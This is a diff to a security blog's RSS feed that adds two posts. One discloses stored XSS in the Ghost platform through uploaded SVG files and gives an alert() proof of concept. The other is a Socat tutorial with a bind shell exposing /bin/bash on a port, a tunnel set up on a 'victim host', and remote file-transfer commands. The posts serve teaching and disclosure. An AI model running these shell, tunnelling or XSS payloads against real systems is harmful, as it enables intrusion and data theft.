@@ -6,9 +6,154 @@
 </description>
     <link>http://snoopysecurity.github.io/</link>
     <atom:link href="http://snoopysecurity.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 08 Jun 2018 19:14:16 +0100</pubDate>
-    <lastBuildDate>Fri, 08 Jun 2018 19:14:16 +0100</lastBuildDate>
+    <pubDate>Fri, 19 Oct 2018 19:31:24 +0100</pubDate>
+    <lastBuildDate>Fri, 19 Oct 2018 19:31:24 +0100</lastBuildDate>
     <generator>Jekyll v3.2.1</generator>
+    
+      <item>
+        <title>Ghost Publishing Platform – SVG Image Upload to Stored Cross-site scripting</title>
+        <description>&lt;p&gt;Often when looking for Stored Cross-site scripting (XSS) vulnerabilities, file upload functionalities can be targeted. This will include trying to upload an HTML file or a Flash SWF file that contains malicious JavaScript.  if it is possible successfully upload these file formats and view these stored files directly, then stored XSS is possible. 
+Scalable Vector Graphics (SVG) file formats are often overlooked during this process. This short blog post will look at how SVG documents can be uploaded and leveraged to execute malicious JavaScript on a domain to achieve Stored XSS.
+Scalable Vector Graphics (SVG).&lt;/p&gt;
+
+&lt;p&gt;Scalable Vector Graphics (SVG) can be used to define vector-based graphics within a webpage. SVG can be mixed with HTML content, as well as XML namespaces. SVG can be used to create interactivity within a webpage and perform animations.
+It should be noted that even though the MIME type for an SVG image is image/svg+xml. It is possible to store JavaScript code within an SVG document and execute it if viewed directly within a web browser. An example proof on concept for this can be seen below&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&amp;gt;
+    &amp;lt;circle cx=&quot;50&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke=&quot;black&quot; stroke-width=&quot;3&quot; fill=&quot;red&quot; /&amp;gt;
+   &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
+      alert(document.domain);
+      alert(document.location);
+   &amp;lt;/script&amp;gt;
+&amp;lt;/svg&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The above SVG document can be saved as a .svg file and can be opened and viewed within any browser to execute JavaScript which will display the current domain and the full URL of the domain that the the JavaScript is executing from.&lt;/p&gt;
+
+&lt;p&gt;It is also possible to embed the above SVG document as part of a HTML page and when rendered, will execute the specified JavaScript. However, it is not possible execute JavaScript through SVG by loading an externally stored SVG file. For example, the following ways cannot be used to execute JavaScript within a webpage.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;https://snoopysecurity.github.io/test.svg&quot; alt=&quot;test&quot; &quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;However, in certain scenarios an &amp;lt;object&amp;gt; element can be used to load and embed an SVG document externally.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;object id=&quot;test&quot; data=&quot;https://snoopysecurity.github.io/test.svg&quot;&amp;gt;&amp;lt;/object&amp;gt;
+&amp;lt;embed src=&quot;https://snoopysecurity.github.io/test.svg&quot; /&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;h3 id=&quot;ghost-publishing-platform&quot;&gt;Ghost Publishing Platform&lt;/h3&gt;
+&lt;p&gt;Ghost is an open source publishing platform which allows a user to create public and private blogs. It was found that during creation of a new blog post, upload of SVG files as document was allowed by the application.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://snoopysecurity.github.io/2.png&quot; alt=&quot;alt text&quot; title=&quot;IMG 1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The below screenshot shows that an SVG file was successfully uploaded and rendered by the application.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://snoopysecurity.github.io/3.png&quot; alt=&quot;alt text&quot; title=&quot;IMG 2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The image location of the stored SVG document can be visited to execute the stored JavaScript.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://snoopysecurity.github.io/4.png&quot; alt=&quot;alt text&quot; title=&quot;IMG 3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cross Site Scripting (XSS) allows clients to inject arbitrary scripting code into application and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, as form of an SVG file) and storing it without performing any validation or encoding.&lt;/p&gt;
+
+&lt;p&gt;This vulnerability could potentially be leveraged by an editor or an author of a post to steal the session of an administrator.&lt;/p&gt;
+
+</description>
+        <pubDate>Thu, 20 Sep 2018 09:00:59 +0100</pubDate>
+        <link>http://snoopysecurity.github.io/webappsec/2018/09/20/ghost_svg_image_upload_to_xss.html</link>
+        <guid isPermaLink="true">http://snoopysecurity.github.io/webappsec/2018/09/20/ghost_svg_image_upload_to_xss.html</guid>
+        
+        
+        <category>Webappsec</category>
+        
+      </item>
+    
+      <item>
+        <title>Introduction to Socat</title>
+        <description>&lt;p&gt;Socat is a network swiss army knife utility and it is very similar to Netcat. However, Socat has many additional features that makes it a better alternative to Netcat. Socat also has advanced features such as listeners for multiple clients, different protocols, reusing connections, connection redirection etc. The following are some few examples of how to use Socat and how it can be a very useful tool during assessments.&lt;/p&gt;
+
+&lt;h3 id=&quot;socat-listener&quot;&gt;Socat Listener&lt;/h3&gt;
+
+&lt;p&gt;The following command tells Socat to use the TCP protocol and listen on port 123 and print any given information from a client to the terminal(STDOUT). The &lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt; value can be changed and specific versions can be used such as TCP4, TCP6, TCP4-LISTEN, and TCP6-LISTEN. The &lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt; value can also be changed to emulate a UDP listener.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP4-LISTEN:123 STDOUT
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;To connect to this server, the following command can be issued.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP:192.168.1.81:123 -
+&amp;gt; hello
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;This will send the world &lt;code class=&quot;highlighter-rouge&quot;&gt;hello&lt;/code&gt; to the socat listener listening on port 123.&lt;/p&gt;
+
+&lt;p&gt;Something similar to the following can also be issued to take something from STDIN and send that to a listener.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whoami | socat STDIN TCP:192.168.1.81:123
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;A useful example of this would be the below where a UDP packet can be created from STDIN and send to a host using socat.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo “UDP packet” | Socat STDIO UDP4-DATAGRAM:192.168.2.1:123
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;h3 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h3&gt;
+&lt;p&gt;The below one liner is an example of binding the bash shell to a port and connecting to it.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/test# socat TCP-LISTEN:1337 EXEC:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;h3 id=&quot;socat-web-server&quot;&gt;Socat web server&lt;/h3&gt;
+&lt;p&gt;To start a web server with Socat, the following command can be issued. The &lt;code class=&quot;highlighter-rouge&quot;&gt;-v&lt;/code&gt; option tells Socat to be verbose and the &lt;code class=&quot;highlighter-rouge&quot;&gt;-T&lt;/code&gt; option can be used to set timeouts.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat -v -T0.05 tcp-l:80,reuseaddr,fork system:&quot;echo 'HTTP/1.1 200 OK'; echo 'Connection: close'; echo; cat&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;h4 id=&quot;https-server&quot;&gt;HTTPS server&lt;/h4&gt;
+
+&lt;p&gt;Socat can also be used to setup HTTPS servers. In the below example, a self-signed certificate is created using Openssl and it is used to setup a HTTPS server.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
+cat key.pem &amp;gt;&amp;gt; cert.pem 
+socat OPENSSL-LISTEN:443,cert=/root/test/cert.pem -
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;The following command can also be using as an alternative to Openssl client and connect to services using SSL/TLS.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat - OPENSSL:192.168.1.81:443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;h3 id=&quot;terminal-emulation&quot;&gt;Terminal Emulation&lt;/h3&gt;
+
+&lt;p&gt;In scenarios where commands need to be issued to a network medium without using a terminal emulator, the following command can be useful.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat READLINE,history:/tmp/serialcommands.txt \
+  OPEN:/dev/ttyS0,ispeed=9600,ospeed=9600,crnl,raw,sane,echo=false
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;redirecting-traffic&quot;&gt;Redirecting Traffic&lt;/h3&gt;
+&lt;p&gt;In scenarios where you want to take incoming connections and redirect it to a Linux application, the following command can be used.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP-LISTEN:443,reuseaddr,fork UNIX-CLIENT:/tmp/foo
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;You can also specify the bind address and specify what IP ranges can connect to this listener.  The &lt;code class=&quot;highlighter-rouge&quot;&gt;su=nobody&lt;/code&gt; value will ensure that forked processes will run as the nobody low-privileged user&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP-LISTEN:443,bind=127.0.0.1,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;h3 id=&quot;tunnelling&quot;&gt;Tunnelling&lt;/h3&gt;
+&lt;p&gt;Socat can also be a good alternative to SSH when looking for a way to tunnel traffic. The following command can be used on a victim host to capture incoming traffic from port 1022 and send it to 192.168.1.70:22&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP4-LISTEN:1022,reuseaddr,fork TCP4:192.168.1.70:22
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;h3 id=&quot;file-transfer&quot;&gt;File transfer&lt;/h3&gt;
+&lt;p&gt;File transfers can also be conducted with ease using Socat.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat FILE:data.txt TCP:192.168.1.81:1337
+socat TCP-LISTEN:1337 OPEN:data.txt,creat,trunc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;However, since Socat isn’t available by default on most systems, Netcat is a better/easier option during post exploitation phases. The static compiled binary version for Socat can be found here if installation in not possible: https://github.com/andrew-d/static-binaries&lt;/p&gt;
+
+</description>
+        <pubDate>Thu, 10 May 2018 09:43:59 +0100</pubDate>
+        <link>http://snoopysecurity.github.io/netsec/2018/05/10/introduction_to_socat.html</link>
+        <guid isPermaLink="true">http://snoopysecurity.github.io/netsec/2018/05/10/introduction_to_socat.html</guid>
+        
+        
+        <category>netsec</category>
+        
+      </item>
     
       <item>
         <title>The target=&quot;_blank&quot; Vulnerability</title>
